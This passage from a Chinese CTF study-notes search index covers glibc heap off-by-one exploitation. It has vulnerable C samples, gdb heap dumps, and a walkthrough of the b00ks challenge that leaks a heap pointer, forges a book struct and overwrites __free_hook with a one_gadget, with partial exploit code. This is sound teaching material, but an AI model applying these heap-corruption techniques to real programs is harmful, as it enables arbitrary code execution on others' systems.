*(fakeBK + 8) == P \u5b9e\u73b0\u6548\u679c\uff1a *P = P - 8 *P = P - 12 P \u7684\u6307\u9488\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904 prev_size \u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f\uff08\u542b chunk head\uff09\uff0c\u7b80\u5355\u8ba1\u7b97\u65b9\u6cd5\uff1a\u4e0a\u4e00\u4e2a chunk \u6307\u9488\u51cf\u53bb next chunk \u6307\u9488\u7684\u503c\u3002 unlink \u601d\u8def\u4e2d\u8ba1\u7b97\u9519\u4e86 chunk \u5927\u5c0f\uff0c\u89e6\u53d1\u4e86 double free or corruption (!prev) \u3002\u6700\u540e\u67e5\u8bc1\u662f\u56e0\u4e3a\u88ab\u91ca\u653e chunk size \u88ab\u4fee\u6539\u9519\u8bef\uff0c\u5bfc\u81f4\u627e\u4e0d\u5230 next chunk \u7684 prev_inuse \u4fe1\u606f\u800c\u5bfc\u81f4\u62a5\u9519 \u6ca1\u6709\u627e\u5230 chunk \u7684\u6807\u5fd7\u4fe1\u606f RELRO: Full RELRO \u7a0b\u5e8f\u4e0d\u80fd\u4fee\u6539 got \u8868\uff0c\u6211\u4eec\u5c31\u53bb\u4fee\u6539 __malloc_hook\u3001__free_hook \u7b49 hook \u51fd\u6570\uff0c\u5177\u4f53\u539f\u7406\u53ef\u4ee5\u770b\u6e90\u7801\uff0c \u5728\u8fdb\u5165 malloc \u6216\u8005 free \u4f1a\u5148\u53bb\u67e5\u5bf9\u5e94\u7684 hook \u51fd\u6570\u662f\u5426\u4e0d\u4f1a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\u5219\u53bb\u6267\u884c hook \u6307\u5411\u7684\u51fd\u6570 \u3002 malloc \u7684\u53c2\u6570\u662f int \uff0c\u6240\u4ee5\u6539 malloc \u76f8\u5173\u51fd\u6570\u4e00\u822c\u6539\u4e3a onegadget free \u7684\u53c2\u6570\u662f \u5730\u5740\uff0c\u6240\u4ee5\u6539 free \u76f8\u5173\u51fd\u6570\u53ef\u4ee5\u6539\u4e3a onegadget \u6216\u8005 system \u7136\u540e\u4f20\u5165 /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740 \u6700\u7b80\u5355\u7684\u662f\u5c31\u662f\u5229\u7528 off-by-one \u6cc4\u9732 Canary \u7684\u503c \u21a9 \u4e3e\u4e2a\u5229\u7528\u4e00\u4e2a\u88ab\u5206\u914d\u7684 chunk size \u4e3a 0x101 \uff0c\u8fd9\u662f prev_in_use \u6807\u8bb0\u8fd9\u4e2a chunk \u662f\u88ab\u4f7f\u7528\u72b6\u6001\uff0c\u5982\u679c\u5f53\u6211\u4eec off-by-null \u5c06size \u8986\u76d6\u4e3a 0x100 \uff0c\u90a3\u4e48\u8fd9\u4e2a chunk \u5c31\u88ab\u8ba4\u4e3a\u662f \u7a7a\u95f2\u72b6\u6001 \u21a9 off-by-null \u21a9 \u4e3a\u5565\u521a\u521a\u597d\u5c31\u662f\u5728 book1 desc \u91cc\u9762\uff1f\u901a\u8fc7\u8c03\u8bd5\u5457\u3002\u6ce8\u610f\u5728 Ubuntu 16 \u8fd9\u91cc\u65e0\u6cd5\u5b9e\u73b0\u6307\u5411 book1 desc \uff0c\u8bf7\u770b\u7ed3\u5c3e\u8865\u5145 \u21a9","title":"off_by_one"},{"location":"Pwn/glibc-heap/off_by_one/#off-by-one","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u5806\u4e2d\u7684 Off-By-One"},{"location":"Pwn/glibc-heap/off_by_one/#_1","text":"\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/off_by_one/#off-by-one_1","text":"off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef\uff08\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1\uff09\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8e Linux \u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808 1 \u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a\uff08heap based\uff09 \u7684 off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002","title":"off-by-one \u6f0f\u6d1e\u539f\u7406"},{"location":"Pwn/glibc-heap/off_by_one/#off-by-one_2","text":"\u6ea2\u51fa\u5b57\u8282\u4e3a\u53ef\u63a7\u5236\u4efb\u610f\u5b57\u8282 \uff1a\u901a\u8fc7\u4fee\u6539\u5927\u5c0f\u9020\u6210\u5757\u7ed3\u6784\u4e4b\u95f4\u51fa\u73b0\u91cd\u53e0\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u4ed6\u5757\u6570\u636e\uff0c\u6216\u662f\u8986\u76d6\u5176\u4ed6\u5757\u6570\u636e\u3002 \u4e5f\u53ef\u4f7f\u7528 NULL \u5b57\u8282\u6ea2\u51fa\u7684\u65b9\u6cd5 \u6ea2\u51fa\u5b57\u8282\u4e3a NULL \u5b57\u8282 \uff1a\u5728 size \u4e3a 0x100 \u7684\u65f6\u5019\uff0c\u6ea2\u51fa NULL \u5b57\u8282\u53ef\u4ee5\u4f7f\u5f97 prev_in_use \u4f4d\u88ab\u6e05\uff0c\u8fd9\u6837\u524d\u5757\u4f1a\u88ab\u8ba4\u4e3a\u662f free \u5757 2 \u3002 \u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 unlink \u65b9\u6cd5\uff08\u89c1 unlink \u90e8\u5206\uff09\u8fdb\u884c\u5904\u7406\u3002 \u53e6\u5916\uff0c\u8fd9\u65f6 prev_inuse \u57df\u5c31\u4f1a\u542f\u7528\uff0c\u5c31\u53ef\u4ee5\u4f2a\u9020 prev_inuse \uff0c\u4ece\u800c\u9020\u6210\u5757\u4e4b\u95f4\u53d1\u751f\u91cd\u53e0\u3002\u6b64\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e unlink \u7684\u65f6\u5019\u6ca1\u6709\u68c0\u67e5\u6309\u7167 prev_inuse \u627e\u5230\u7684\u5757\u7684\u5927\u5c0f\u4e0e prev_inuse \u662f\u5426\u4e00\u81f4\uff08libc 2.28 \u4e4b\u524d\uff09\u3002 \u6700\u65b0\u7248\u672c\u4ee3\u7801\u4e2d\uff0c\u5df2\u52a0\u5165\u9488\u5bf9 2 \u4e2d\u540e\u4e00\u79cd\u65b9\u6cd5\u7684 check \uff0c\u4f46\u662f\u5728 2.28 \u524d\u5e76\u6ca1\u6709\u8be5 check \u3002 /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_inuse ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); /* \u540e\u4e24\u884c\u4ee3\u7801\u5728\u6700\u65b0\u7248\u672c\u4e2d\u52a0\u5165\uff0c\u5219 2 \u7684\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4f7f\u7528\uff0c\u4f46\u662f 2.28 \u53ca\u4e4b\u524d\u90fd\u6ca1\u6709\u95ee\u9898 */ if ( __glibc_unlikely ( chunksize ( p ) != prevsize )) malloc_printerr ( \"corrupted size vs. prev_inuse while consolidating\" ); unlink_chunk ( av , p ); }","title":"off-by-one \u5229\u7528\u601d\u8def"},{"location":"Pwn/glibc-heap/off_by_one/#1","text":"int my_gets ( char * ptr , int size ) { int i ; //\u8fd9\u91cc\u5199\u6210\u5c0f\u4e8e\u7b49\u4e8e\u5bfc\u81f4\u53ef\u4ee5\u591a\u5199\u5165\u4e00\u4e2a\u5b57\u8282 for ( i = 0 ; i <= size ; i ++ ) { ptr [ i ] = getchar (); } return i ; } int main () { void * chunk1 , * chunk2 ; chunk1 = malloc ( 16 ); chunk2 = malloc ( 16 ); puts ( \"Get Input:\" ); my_gets ( chunk1 , 16 ); return 0 ; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2a off-by-one \u6f0f\u6d1e\uff0c\u539f\u56e0\u662f for \u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f 30 \u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u9694 3 \u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u6848 10 \u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u6709 10 \u4e2a\u95f4\u9694\uff0c11 \u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a 16 \u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 < === chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_inuse \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 < === chunk2 0x602030: 0x0000000000000000 0x0000000000000000","title":"\u793a\u4f8b 1"},{"location":"Pwn/glibc-heap/off_by_one/#2","text":"\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff08\u4e0d\u8003\u8651\u6808\u6ea2\u51fa\uff09\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86 off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c strlen \u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \\x00 \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \\x00 \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411 chunk1 \u4e2d\u5199\u5165\u4e86 25 \u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24 \u540e\u6267\u884c strcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400(11) \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one 3 \uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684 CPU \u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2a DWORD \u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41","title":"\u793a\u4f8b 2"},{"location":"Pwn/glibc-heap/off_by_one/#1-asis-ctf-2016-b00ks","text":"WiKi\u4e0a\u6ca1\u6709\u660e\u786e\u8bf4\u660e\u9898\u76ee\u7684\u73af\u5883\uff0c\u591a\u65b9\u786e\u8ba4\u540e\uff1a\u5982\u679c\u4f7f\u7528\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u73af\u5883\u5e94\u8be5\u662f ubuntu 18 ;\u5982\u679c\u4f7f\u7528 unlink \u4e5f\u5c31\u662f wiki \u4e2d\u7684\u7b80\u6d01\u65b9\u6848\uff0cubuntu16&18\u3002 \u4ee5\u4e0b wp \u5173\u4e8e\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u65b9\u6cd5\u90fd\u66ff\u6362\u4e3a\u6211\u81ea\u5df1\u7684\u7248\u672c","title":"\u5b9e\u4f8b 1: Asis CTF 2016 b00ks"},{"location":"Pwn/glibc-heap/off_by_one/#_2","text":"\u9898\u76ee\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/glibc-heap/off_by_one/#_3","text":"\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002 1 . Create a book 2 . Delete a book 3 . Edit a book 4 . Print book detail 5 . Change current author name 6 . Exit \u8fdb\u5165\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165\u4e00\u4e2a author name \u957f\u5ea6\u8981\u6c42\u4e0d\u5927\u4e8e32\u3002 \u6bcf\u672c\u4e66\uff08chunk\uff09\u4fe1\u606f\u7528\u5927\u5c0f\u4e3a 0x20 \u7684 book \u7ed3\u6784\u4f53\u6765\u7ef4\u62a4\uff0c\u5176\u4e2d name \u548c description \u5728\u5806\u4e0a\u5206\u914d\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u662f\u5730\u5740\u6307\u9488\u3002book_name\u3001book_description \u5927\u5c0f\u81ea\u5b9a\u4e14\u65e0\u9650\u5236\u5927\u5c0f\u3002 \u8be6\u7ec6\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a\uff08\u4ece my_create \u51fd\u6570\u4e2d\u7ed3\u5c3e\u53ef\u63a8\u51fa\u7ed3\u6784\u4f53\uff0c\u4e0b\u9762\u662f\u7b80\u5316\u8fc7\u7684\uff09 struct book { int id ; //8bit char * book_name ; //8bit char * book_description ; //8bit int size ; //8bit } \u7ed3\u6784\u4f53\u7533\u8bf7\u597d\u540e\uff0c\u540c\u4e00\u653e\u7f6e\u5230 off_202010 \u5217\u8868\u4e2d\u7ba1\u7406\u3002 * (( _QWORD * ) off_202010 + v2 ) = book ;","title":"\u7a0b\u5e8f\u529f\u80fd"},{"location":"Pwn/glibc-heap/off_by_one/#_4","text":"\u7a0b\u5e8f\u7f16\u5199\u5b9a\u4e49\u7684\u8bfb\u5165\u51fd\u6570 sub_9F5() \u5b58\u5728 null byte off-by-one \uff08\u540e\u6587\u79f0\u8be5\u51fd\u6570\u4e3a my_read() \uff09\u3002\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\u6e90\u7801\uff0c\u6ce8\u610f\u7559\u610f\u6700\u540e\u4e00\u6b21\u5faa\u73af\u7684\u8fb9\u754c\u8f93\u5165\u3002 signed __int64 __fastcall my_read ( _BYTE * a1 , int a2 ) { int i ; // [rsp+14h] [rbp-Ch] _BYTE * buf ; // [rsp+18h] [rbp-8h] if ( a2 <= 0 ) return 0L L ; buf = a1 ; for ( i = 0 ; ; ++ i ) { if ( ( unsigned int ) read ( 0 , buf , 1uLL ) != 1 ) return 1L L ; if ( * buf == 10 ) break ; ++ buf ; if ( i == a2 ) //\u6ca1\u6709\u6b63\u786e\u5904\u7406\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5199\u5165\u4f4d\u7f6e break ; } * buf = 0 ; //\u6f0f\u6d1e\u70b9 return 0L L ; } \u5bf9\u6bd4\u4e00\u4e0b\u5176\u4ed6\u8c03\u7528 my_read \u51fd\u6570\u7684\u53c2\u6570\u5c31\u77e5\u9053\u4e3a\u4ec0\u4e48\u8f93\u5165 author name \u4f1a\u51fa\u73b0 off-b-null \uff1a description \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 name \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 \u4f46\u662f my_name \u53ef\u4ee5\u653e 32 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a 32 \uff0c\u6ca1\u6709\u4e3a\u6700\u540e\u7ed3\u675f\u7b26\u9884\u7559\u4e00\u4e2a\u4f4d\u7f6e\u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/glibc-heap/off_by_one/#_5","text":"","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/off_by_one/#off-by-one_3","text":"","title":"off-by-one"},{"location":"Pwn/glibc-heap/off_by_one/#_6","text":"\u6211\u4eec\u5148\u770b\u770b author name \u6ea2\u51fa\u7684 \\x00 \u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\u3002\u5148\u4e00\u6bb5\u8c03\u8bd5\u7684 exp \uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5728\u811a\u672c\u4e2d\uff0c\u8f93\u5165 author name \u4e3a \"a\"*0x32 \uff0c\u5728\u7533\u8bf7\u4e00\u4e2a book \uff0c\u6700\u540e\u624d\u8c03\u7528 gdb \uff0c\u7a0b\u5e8f\u6253\u5f00 PIE \u4fdd\u62a4\u6211\u4eec\u5c31\u6253\u4e00\u4e2a\u65ad\u70b9\uff0c\u65b9\u4fbf\u8ba1\u7b97\u504f\u79fb\u627e\u5230 name \uff1a gdb.attach(p,\"b *$rebase(0x0B94)\") \u3002 \u5148\u627e\u5230 name \u548c chunk_list \u771f\u5b9e\u5730\u5740\uff1a chunk_list \u5728\u4f4e\u5730\u5740\uff0c\u4ece\u5b83\u5f00\u59cb\u67e5\u5185\u5b58\uff1a \u53ef\u4ee5\u770b\u5230\u5b9e\u9645\u4e0a\u4e0d\u662f\u4ece chunk_list \u5f00\u59cb\u5b58\u653e\u7ed3\u6784\u4f53\u6307\u9488\uff0c\u800c\u662f\u5b9a\u5411\u5230\u4e86 0x555555756060 \uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u8bb0\u5f55\u7ed3\u6784\u4f53\u6307\u9488\uff08\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e24\u4e2a book \uff09\u3002\u7136\u540e\u6211\u4eec\u89c2\u5bdf name \uff0c\u5728\u7ed3\u6784\u4f53\u6307\u9488\u524d\u9762\uff0cname \u6ea2\u51fa\u7684\u4f1a\u8986\u76d6\u6389 book1 \u7ed3\u6784\u4f53\u6307\u9488\u3002\u6211\u4eec\u7ed9\u4e00\u6b21 name \u770b\u770b\u6548\u679c\uff1a \u8fd9\u6837\u6ea2\u51fa\u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u53bb 0x0000555555758300 \u627e book1 \u8d44\u6599\uff0c\u800c\u4e0d\u662f 0x0000555555758330 \u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u80fd\u591f\u5728 0x0000555555758300 \u4f2a\u9020\u4e00\u4e2a book \u7ed3\u6784\u4f53\uff0c\u5c31\u80fd\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u8f93\u51fa&\u4fee\u6539\u529f\u80fd\uff0c\u5b9e\u73b0\u4efb\u610f\u8bfb\u5199\u3002\u7a0b\u5e8f\u662f Full RELRO \uff0c\u5c31\u5199 hook \u3002\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u4e48\u4e2a\u601d\u8def\uff0c\u653b\u51fb\u6d41\u7a0b\uff1a author name \u586b\u5145 0x20 bit creat boo1 && book2\uff0c\u8986\u76d6\u7ed3\u675f\u7b26 print book1 info \u4ece author name \u6cc4\u9732 book1 \u7ed3\u6784\u4f53\u5730\u5740 edit book1 description \u586b\u5165 payload\uff0c\u6784\u5efa fake book1 \u7ed3\u6784\u4f53 change author name \u8986\u76d6 book1 \u6307\u9488\uff0c\u8ba9\u5176\u6307\u5411 fake book1 print book1 info \u6cc4\u9732 book2 \u5730\u5740\uff08mmap\u5730\u5740\uff09 edit book1 \u6765\u4fee\u6539 book2 *description \u6307\u5411 free_hook edit book2 \u4fee\u6539 free_hook \u4e3a one_gadget","title":"\u6ea2\u51fa\u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\uff1f"},{"location":"Pwn/glibc-heap/off_by_one/#book1","text":"\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684 my_read \u51fd\u6570\u5b58\u5728 null byte off-by-one \uff0c\u4e8b\u5b9e\u4e0a my_read \u8bfb\u5165\u7684\u7ed3\u675f\u7b26 '\\x00' \u662f\u5199\u5165\u5230 0x555555756060 \u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f53 0x555555756060\uff5e0x555555756068 \u5199\u5165 book \u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26 '\\x00' \uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370 author name \u5c31\u53ef\u4ee5\u83b7\u5f97 pointer array \u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x4141414141414141 0x4141414141414141 0x555555756050: 0x4141414141414141 0x4141414141414141 <== author name 0x555555756060: 0x0000555555758330 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728 author name \u4e2d\u9700\u8981\u8f93\u5165 32 \u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efa book1 \uff0c\u8fd9\u4e2a book1 \u7684\u6307\u9488\u4f1a\u8986\u76d6 author name \u4e2d\u6700\u540e\u7684 NULL \u5b57\u8282\uff0c\u4f7f\u5f97\u8be5\u6307\u9488\u4e0e author name \u76f4\u63a5\u8fde\u63a5\uff0c\u8fd9\u6837\u8f93\u51fa author name \u5219\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u5806\u6307\u9488\u3002 createname ( \"A\" * 32 ) createbook ( 128 , \"a\" * 8 , 32 , \"b\" * 8 ) createbook ( 0x21000 , \"/bin/sh \\x00 \" , 0x21000 , \"d\" * 8 ) # getshell\u7528\u968f\u5e26\u4e5f\u5148\u7533\u8bf7\uff0c\u5bf9\u672c\u6b65\u6ca1\u6709\u5f71\u54cd book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' ))","title":"\u6cc4\u6f0f book1 \u7ed3\u6784\u4f53\u5730\u5740"},{"location":"Pwn/glibc-heap/off_by_one/#_7","text":"\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cd change \u529f\u80fd\uff0c change \u529f\u80fd\u7528\u4e8e\u4fee\u6539 author name \uff0c\u6240\u4ee5\u901a\u8fc7 change \u53ef\u4ee5\u5199\u5165 author name \uff0c\u5229\u7528 off-by-one \u8986\u76d6 book1 \u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389 book1 \u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411 book1 \u7684 description 4 \uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86 edit \u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 description 